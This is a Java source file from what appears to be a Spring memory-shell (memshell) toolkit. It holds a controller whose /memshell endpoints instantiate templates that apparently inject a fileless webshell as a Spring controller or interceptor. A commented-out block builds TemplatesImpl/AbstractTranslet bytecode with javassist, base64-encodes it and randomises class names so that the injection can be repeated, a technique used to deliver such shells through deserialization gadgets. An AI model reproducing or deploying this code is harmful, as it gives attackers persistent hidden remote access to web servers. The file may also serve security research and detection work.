package org.su18.memshell.spring.controller;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import org.apache.tomcat.util.codec.binary.Base64;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import org.springframework.web.servlet.support.RequestContextUtils;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Map;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import static org.su18.memshell.spring.controller.DynamicUtils.CONTROLLER_CLASS_STRING;
import org.su18.memshell.spring.controller.SpringInterceptorTemplate;


/**
 * 访问此接口动态添加 controller
 *
 * @author Zeo
 */

@Controller
@RequestMapping(value = "/memshell")
public class Add {
    @GetMapping(value = "/controller")
    public void controller(HttpServletRequest request, HttpServletResponse response) throws Exception {
//        final T templates = tplClass.newInstance();
//        Class tplClass;
//        Class abstTranslet;
//        Class transFactory;
//
//        tplClass = TemplatesImpl.class;
//        abstTranslet = AbstractTranslet.class;
//        transFactory = TransformerFactoryImpl.class;
//
//        byte[] classBytes = new byte[0];
//        ClassPool pool = ClassPool.getDefault();
////        pool.insertClassPath(new ClassClassPath(abstTranslet));
////将当前ClassLoader添加到ClassPath
//        pool.appendClassPath(new LoaderClassPath(Thread.currentThread().getContextClassLoader()));
//        CtClass superC = pool.get(abstTranslet.getName());
//        CtClass ctClass = pool.get(Add.class.getName());
//        ctClass.setSuperclass(superC);
//
//        // 修改b64字节码
//        CtClass springTemplateClass = pool.get("org.su18.memshell.spring.controller.SpringInterceptorTemplate");
//        String clazzName = "org.su18.memshell.spring.controller.SpringInterceptorTemplate" + System.nanoTime();
//        springTemplateClass.setName(clazzName);
//        String encode = Base64.encodeBase64String(springTemplateClass.toBytecode());
//        String b64content = "b64=\"" + encode + "\";";
//        ctClass.makeClassInitializer().insertBefore(b64content);
//        // 修改SpringInterceptorMemShell随机命名 防止二次打不进去
//        String clazzNameContent = "clazzName=\"" + clazzName + "\";";
//        ctClass.makeClassInitializer().insertBefore(clazzNameContent);
//        ctClass.setName(SpringInterceptorTemplate.class.getName() + System.nanoTime());
//        classBytes = ctClass.toBytecode();


        SpringInterceptorMemShellTemplates springInterceptorMemShellTemplates = new SpringInterceptorMemShellTemplates();
        response.getWriter().println("spring add controller");
    }
    @GetMapping(value = "/interceptor")
    public void interceptor(HttpServletRequest request, HttpServletResponse response) throws Exception {
        new SpringInterceptorTemplate();
        response.getWriter().println("spring add interceptor");
    }
}